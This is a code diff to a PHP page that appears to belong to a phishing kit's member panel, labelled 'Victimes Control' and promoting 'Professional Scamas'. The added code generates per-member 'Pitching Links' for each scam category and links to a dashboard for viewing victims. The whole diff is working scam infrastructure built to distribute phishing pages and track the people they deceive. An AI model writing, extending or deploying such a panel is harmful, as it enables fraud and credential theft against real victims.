@@ -86,9 +86,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <div class="victimes-control">
         <div class="panel-header">.: Victimes Control :.</div>
         <div class="panel-body" style="text-align: center;">
-            <p>Sorry You Must Be Member To See Your Victimes</p>
-            <p>Sign Up for Get Your Professional Scamas</p>
-            <p><a href="signup.php">Sign Up Here</a></p>
+            <?php if (isset($_SESSION['user'])): ?>
+                <h3>Your Pitching Links</h3>
+                <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
+                    <?php
+                    $categories = json_decode(file_get_contents('categories.json'), true);
+                    foreach ($categories as $cat):
+                        $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/" . strtolower($cat) . ".php?user=" . urlencode($_SESSION['user']['username']);
+                    ?>
+                        <div style="border: 1px solid #ccc; padding: 5px; background: #f9f9f9; width: 150px;">
+                            <strong><?php echo htmlspecialchars($cat); ?></strong><br>
+                            <input type="text" value="<?php echo htmlspecialchars($generated_link); ?>" style="width: 100%; font-size: 9px;" readonly onclick="this.select()">
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+                <p><a href="dashboard.php">View Your Victimes</a></p>
+            <?php else: ?>
+                <p>Sorry You Must Be Member To See Your Victimes</p>
+                <p>Sign Up for Get Your Professional Scamas</p>
+                <p><a href="signup.php">Sign Up Here</a></p>
+            <?php endif; ?>
         </div>
     </div>
 </div>
